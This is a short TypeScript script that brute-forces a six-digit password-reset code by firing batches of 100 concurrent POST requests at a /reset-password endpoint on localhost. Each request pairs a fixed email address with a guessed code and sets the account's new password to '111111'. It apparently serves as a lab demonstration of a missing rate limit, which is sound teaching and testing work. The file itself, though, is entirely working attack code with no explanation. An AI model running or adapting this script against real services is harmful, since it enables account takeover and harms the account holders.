import axios from "axios"

const sendRequest = async (otp: string) => {
  let data = JSON.stringify({
    "email": "sarfraz123@gmail.com",
    "otp": otp,
    "newPassword": "111111"
  });

  let config = {
    method: 'post',
    maxBodyLength: Infinity,
    url: 'http://localhost:3000/reset-password',
    headers: {
      'Content-Type': 'application/json'
    },
    data: data
  };

  try {
    await axios.request(config)
  } catch (error) {
    // console.log(error)
  }
}

async function main() {
  for (let i = 0; i <= 999999; i += 100) {

    const p = []
    console.log(i)
    for (let j = 0; j < 100; j++) {
      p.push(sendRequest((i + j).toString()))
    }
    await Promise.all(p)
  }
}
main()

  